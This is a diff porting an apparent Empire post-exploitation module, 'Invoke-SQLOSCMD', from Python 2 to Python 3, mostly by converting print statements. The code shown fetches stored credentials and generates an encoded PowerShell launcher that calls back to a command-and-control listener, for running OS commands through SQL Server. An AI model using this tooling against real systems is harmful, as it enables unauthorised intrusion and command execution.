@@ -1,5 +1,8 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 from lib.common import helpers
-class Module:
+class Module(object):
     def __init__(self, mainMenu, params=[]):
         self.info = {
             'Name': 'Invoke-SQLOSCMD',
@@ -79,7 +82,7 @@ class Module:
         credID = self.options["CredID"]['Value']
         if credID != "":
             if not self.mainMenu.credentials.is_credential_valid(credID):
-                print helpers.color("[!] CredID is invalid!")
+                print(helpers.color("[!] CredID is invalid!"))
                 return ""
             (credID, credType, domainName, username, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
             if domainName != "":
@@ -108,14 +111,14 @@ class Module:
             with open(moduleSource, 'r') as source:
                 moduleCode = source.read()
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
         script = moduleCode
 
 
         if command == "":
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
             else:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
